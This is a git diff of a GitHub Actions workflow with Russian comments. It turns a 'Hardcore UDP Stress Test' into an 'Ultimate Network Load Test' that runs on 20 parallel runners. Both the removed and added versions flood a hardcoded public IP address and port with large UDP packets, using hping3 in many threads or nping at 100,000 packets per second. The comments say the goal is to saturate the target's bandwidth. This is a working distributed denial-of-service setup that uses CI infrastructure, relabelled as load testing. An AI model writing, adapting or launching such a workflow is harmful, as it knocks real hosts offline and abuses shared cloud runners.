@@ -1,10 +1,10 @@
-name: Hardcore UDP Stress Test
+name: Ultimate Network Load Test
 
 on:
-  workflow_dispatch: # Запуск вручную
+  workflow_dispatch:
 
 jobs:
-  flood:
+  heavy-load:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
@@ -12,32 +12,20 @@ jobs:
         machine: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      - name: Install hping3
-        run: sudo apt-get update && sudo apt-get install -y hping3
+      - name: Install Nmap/Nping
+        run: sudo apt-get update && sudo apt-get install -y nmap
 
-      - name: Run Extreme UDP Flood
+      - name: Extreme UDP Load
         run: |
-          echo "Starting extreme load from machine №${{ matrix.machine }}"
+          echo "Запуск максимальной нагрузки с машины №${{ matrix.machine }}"
           
-          # Настройка системы для максимального выхлопа
-          sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535"
+          # TARGET: 212.22.85.148
+          # PORT: 8500
           
-          # Цель
-          TARGET_IP="212.22.85.148"
-          TARGET_PORT="8500"
+          # Параметры nping:
+          # --udp: использовать протокол UDP
+          # --rate 100000: Пытаться слать 100 000 пакетов в секунду (это очень много)
+          # -c 100000000: Общее количество пакетов (огромное, чтобы не кончилось)
+          # --data-length 1400: Максимальный размер данных в пакете (чтобы забить канал в Gbps)
           
-          # Запускаем 25 потоков в фоне
-          # -d 1350: Размер пакета (почти максимум MTU, чтобы забить Mbps)
-          # --flood: Гнать без пауз
-          # Мы НЕ используем --rand-source, чтобы трафик точно уходил
-          
-          for i in {1..25}; do
-            sudo hping3 --udp -p $TARGET_PORT -d 1350 --flood $TARGET_IP > /dev/null 2>&1 &
-          done
-
-          # Тест будет идти 15 минут (900 секунд)
-          echo "Flood is running in 25 threads. Waiting..."
-          sleep 900
-          
-          # Останавливаем всё
-          sudo pkill hping3
+          sudo nping --udp -p 8500 --rate 100000 -c 100000000 --data-length 1400 212.22.85.148
